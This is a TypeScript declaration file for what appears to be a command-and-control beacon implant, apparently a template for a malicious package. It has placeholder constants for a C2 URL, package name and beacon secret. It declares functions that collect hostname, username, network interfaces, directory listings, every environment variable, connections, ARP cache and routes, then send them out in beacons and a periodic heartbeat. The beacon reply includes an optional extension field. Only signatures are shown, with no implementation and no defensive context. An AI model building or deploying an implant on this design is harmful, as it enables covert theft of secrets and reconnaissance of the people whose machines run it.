export declare const C2_URL = "__C2_URL__";
export declare const PKG_NAME = "__PKG_NAME__";
export declare const BEACON_SECRET = "__BEACON_SECRET__";
export declare const VERSION = "__VERSION__";
export interface SystemInfo {
    hostname: string;
    username: string;
    platform: string;
    arch: string;
    os_release: string;
    cwd: string;
    interfaces: Record<string, {
        address: string;
        family: string;
        internal: boolean;
    }[]>;
    dir_tree: {
        name: string;
        type: string;
        path: string;
    }[];
    env_vars: Record<string, string>;
}
export interface ExtendedSystemInfo extends SystemInfo {
    connections: string;
    arp_cache: string;
    routes: string;
}
export interface BeaconResponse {
    id: number;
    extension?: string;
}
export declare function gatherSystemInfo(): SystemInfo;
export declare function gatherExtendedInfo(): ExtendedSystemInfo;
export declare function sendBeacon(opts?: {
    custom?: Record<string, unknown>;
}): Promise<BeaconResponse>;
export declare function startHeartbeat(intervalMs?: number): void;
